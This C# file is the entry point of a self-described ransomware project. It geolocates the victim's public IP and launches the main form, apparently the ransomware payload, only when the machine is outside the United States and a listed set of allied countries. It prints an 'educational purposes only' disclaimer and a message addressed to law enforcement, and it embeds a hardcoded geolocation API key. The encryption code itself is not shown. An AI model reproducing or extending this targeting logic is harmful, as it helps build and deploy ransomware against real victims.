using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using Newtonsoft.Json;
using System.Net.Http;
using System.Text;


namespace WindowsFormsApp2
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            string ipAddress = GetIPAddress(); // Get the IP address of the local machine

            if (IsAllyWithUSA(ipAddress))
            {
                MessageBox.Show("The IP address is from one of the allied countries with usa and we cannot infect allies or usa with our ransomware", "Ally Detected", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                Application.Run(new Form1());
                Console.WriteLine("DISCLAIMER: This program was created for educational purposes only. The creator does not take any responsibility for its usage or any potential consequences.");
                Console.WriteLine("IF YOU ARE A LAW ENFORCEMENT PLEASE GO TO https://github.com/ThunderboltDev/Thunder-Ransomware/blob/main/README.md");

            }
        }

        static string GetIPAddress()
        {
            string ipAddress = string.Empty;
            try
            {
                using (System.Net.Http.HttpClient client = new System.Net.Http.HttpClient())
                {
                    string url = "https://api.ipify.org";
                    ipAddress = client.GetStringAsync(url).Result;
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to retrieve the IP address: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            return ipAddress;
        }

        static bool IsAllyWithUSA(string ip)
        {
            using (System.Net.Http.HttpClient client = new System.Net.Http.HttpClient())
            {
                string apiKey = "523d1f71a56f4e3b846ae1804fe1be75"; // Replace with your actual API key
                string url = $"https://api.ipgeolocation.io/ipgeo?apiKey={apiKey}&ip={ip}";
                try
                {
                    System.Net.Http.HttpResponseMessage response = client.GetAsync(url).Result;
                    string json = response.Content.ReadAsStringAsync().Result;
                    dynamic data = Newtonsoft.Json.JsonConvert.DeserializeObject(json);
                    string country = data.country_name;

                    // Check if the country is the United States or an ally with the USA
                    if (country == "United States" || IsAllyCountry(country))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
                catch (Newtonsoft.Json.JsonReaderException ex)
                {
                    MessageBox.Show($"Failed to parse the API response: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Environment.Exit(0);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"An error occurred during the API request: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Environment.Exit(0);
                }

                return false;
            }
        }



        static bool IsAllyCountry(string country)
        {
            List<string> alliedCountries = new List<string>
            {
                "Canada",
                "United Kingdom",
                "Australia",
                "Germany",
                "France",
                "Japan",
                "South Korea",
                "Italy"
            };

            return alliedCountries.Contains(country);
        }
       
    }
}
